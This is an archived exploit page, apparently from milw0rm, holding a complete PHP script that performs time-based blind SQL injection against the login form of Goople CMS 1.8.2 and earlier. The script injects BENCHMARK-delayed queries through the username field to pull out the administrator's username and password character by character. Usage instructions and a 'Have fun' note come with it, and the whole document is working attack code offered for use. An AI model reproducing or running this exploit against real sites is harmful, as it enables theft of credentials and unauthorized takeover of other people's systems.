<html><head><title>Goople <= 1.8.2 (frontpage.php) Blind SQL Injection Exploit</title></head><pre>#--+++=========================================================+++--#
#--+++====== Goople &lt;= 1.8.2 Blind SQL Injection Exploit ======+++--#
#--+++=========================================================+++--#

#!/usr/bin/php
&lt;?

function usage ()
{
	echo
		&quot;\n[+] Goople &lt;= 1.8.2 Blind SQL Injection Exploit&quot;.
		&quot;\n[+] Author: darkjoker&quot;.
		&quot;\n[+] Site  : http://darkjoker.net23.net&quot;.
		&quot;\n[+] Usage : php xpl.php &lt;hostname&gt; &lt;path&gt; [key]&quot;.
		&quot;\n[+] Ex.   : php xpl.php localhost /goople abcdefghijklmnopqrstuvwxyz&quot;.
		&quot;\n[+] Note  : Have fun ^^\n\n&quot;;
	exit ();
}

function check ($hostname, $path, $field, $pos, $char)
{
	$char = ord ($char);
	$fp = fsockopen ($hostname, 80);
	$usr = &quot;username=1' OR IF((ASCII(SUBSTRING((SELECT {$field} FROM GoopleCMS_users_ WHERE id =1),{$pos},1))={$char})&quot;.
	       &quot;,BENCHMARK(200000000,CHAR(0)),0) OR '1' = '2&quot;;
	$usr = str_replace (&quot;'&quot;, &quot;%27&quot;, $usr);
	$usr = str_replace (&quot; &quot;, &quot;%20&quot;, $usr);
	$pwd = &quot;password=asd&quot;;
	$sub = &quot;loginsubmit=loginsubmit&amp;loginsubmit=Login&quot;;
	$str = &quot;{$usr}&amp;{$pwd}&amp;{$sub}&quot;;
	$post = &quot;POST {$path}/frontpage.php HTTP/1.1\r\n&quot;.
		&quot;Host: {$hostname}\r\n&quot;.
		&quot;Connection: Close\r\n&quot;.
		&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;.
		&quot;Content-Length: &quot; . strlen ($str) . &quot;\r\n\r\n&quot;.
		$str;
	
	fputs ($fp, $post);
	$a =  time ();
	while (!feof ($fp))
		$res .= fgets ($fp, 1024);

	$b =  time ();
	fclose ($fp);

	if ($b - $a &gt; 4)
		return true;
	else
		return false;
}


function brute ($hostname, $path, $field, $key)
{
	$pos = 1;
	$chr = 0;
	while ($chr &lt; strlen ($key))
	{
		if (check ($hostname, $path, $field, $pos, $key [$chr]))
		{
			echo $key [$chr];
			$chr = -1;
			$pos++;
		}
		$chr++;
	}
}


if (count ($argv) != 3)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$key = $argv [3];
if (empty ($key))
	$key = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;

echo &quot;[+] Username: &quot;;
brute ($hostname, $path, &quot;username&quot;, $key);
echo &quot;\n[+] Password: &quot;;
brute ($hostname, $path, &quot;password&quot;, $key);
echo &quot;\n&quot;;

?&gt;

# milw0rm.com [2009-01-06]</pre></html>